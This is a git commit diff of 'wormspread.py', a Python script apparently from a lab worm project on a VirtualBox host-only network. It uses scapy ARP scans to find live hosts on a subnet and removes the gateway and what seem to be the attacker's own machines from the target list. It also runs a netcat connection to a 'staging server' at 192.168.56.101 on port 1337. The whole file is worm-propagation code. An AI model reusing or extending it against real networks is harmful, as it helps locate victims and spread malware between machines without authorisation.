5896df8552295109e6f7f0d0bafd708df426e45d
Greg Randall <77461008+gregorymrandall@users.noreply.github.com>
2021-07-07 14:38:11 -0400

    Update wormspread.py

--- wormspread.py
+++ wormspread.py
@@ -1,12 +1,10 @@
 #!/usr/bin/env python3
-
 import sys
 import subprocess
 
 from scapy.all import ARP, Ether, srp
 
 def worm_spread():
-
     target_ip = "192.168.56.111/24"
 
     # create ARP packet
@@ -21,10 +19,14 @@ def worm_spread():
 
     # a list of clients, to be filled in the upcoming loop
     clients = []
-
-    for sent, received in result:
-    # for each response, append ip 
+    for sent,received in result:
         clients.append(received.psrc)
+    try:
+        clients.remove('192.168.56.1') 
+        clients.remove('192.168.56.100')
+        clients.remove('192.168.56.101')
+    except:
+        pass
     return clients
 print(worm_spread())
 
@@ -32,5 +34,3 @@ def nc_listener():
     #sending to staging server via netcat
     subprocess.run(["nc", "192.168.56.101", "1337"])
 print(nc_listener())
-    
-
